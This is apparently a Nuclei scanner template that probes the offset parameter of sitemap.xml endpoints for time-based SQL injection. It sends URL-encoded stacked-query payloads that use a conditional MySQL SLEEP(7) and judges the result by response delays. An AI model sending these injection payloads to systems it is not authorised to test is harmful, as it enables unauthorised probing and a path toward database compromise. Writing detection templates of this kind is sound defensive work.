id: sitemap-offset-time-based-sqli

info:
  name: Sitemap Offset Parameter Time-Based SQL Injection
  author: eabubakr21
  severity: high
  description: |
    Detects potential time-based SQL injection in the offset parameter
    of sitemap.xml endpoints using a MySQL/MariaDB conditional SLEEP()
    expression.

    The template performs baseline, false-condition, and true-condition
    requests. A match requires the true condition to introduce a
    reproducible delay while the baseline and false condition remain fast.
  classification:
    cwe-id: CWE-89
  metadata:
    max-request: 3
    verified: false
  tags: sqli,time-based,mysql,mariadb,sitemap

http:
  - raw:
      - |
        GET /sitemap.xml?offset=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |
        GET /sitemap.xml?offset=1%3BSELECT%20IF%28%288303%3C8302%29%2CSLEEP%287%29%2C2356%29%23 HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |
        GET /sitemap.xml?offset=1%3BSELECT%20IF%28%288303%3E8302%29%2CSLEEP%287%29%2C2356%29%23 HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    req-condition: true

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 >= 200 && status_code_1 < 300"
          - "status_code_2 >= 200 && status_code_2 < 300"
          - "status_code_3 >= 200 && status_code_3 < 300"
          - "duration_1 < 3"
          - "duration_2 < 3"
          - "duration_3 >= 6"
          - "duration_3 - duration_1 >= 5"
          - "duration_3 - duration_2 >= 5"
        condition: and
